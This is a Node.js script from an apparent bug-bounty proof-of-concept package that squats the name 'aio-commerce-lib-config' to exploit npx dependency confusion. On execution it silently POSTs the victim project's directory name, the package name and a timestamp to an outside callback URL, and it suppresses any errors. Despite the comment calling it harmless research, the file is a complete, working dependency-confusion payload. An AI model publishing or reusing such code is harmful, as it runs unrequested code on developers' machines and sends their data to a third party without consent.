#!/usr/bin/env node

// SECURITY RESEARCH: Harmless npx confusion PoC.
// This package sends a simple "ping" to verify execution.
// No system data, source code, or PII is accessed or transmitted.
// Contact: dd_06@intigriti.me

var http  = require('http');
var https = require('https');
var path  = require('path');

// INIT_CWD is set by npm to the directory where npx was invoked from.
var targetDir       = process.env.INIT_CWD || process.cwd();
var safeProjectName = path.basename(targetDir);

var info = {
    pkg:       "aio-commerce-lib-config",
    timestamp: new Date().toISOString(),
    transport: 'http (npx)',
    project:   safeProjectName,
};

var CALLBACK_URL = "https://deepbounty.dd06-dev.fr/cb/d2545461-5256-4048-8ee1-8c9c3e8c3227";

function sendPing() {
    var parsed   = new URL(CALLBACK_URL);
    var postData = JSON.stringify(info);
    var lib      = parsed.protocol === 'https:' ? https : http;

    var req = lib.request(CALLBACK_URL, {
        method: 'post',
        headers: {
            'Content-Type':   'application/json',
            'Content-Length': Buffer.byteLength(postData),
        },
        timeout: 15000,
    }, (res) => { res.on('data', () => {}); });

    req.on('error', () => {});
    req.write(postData);
    req.end();
}

sendPing();
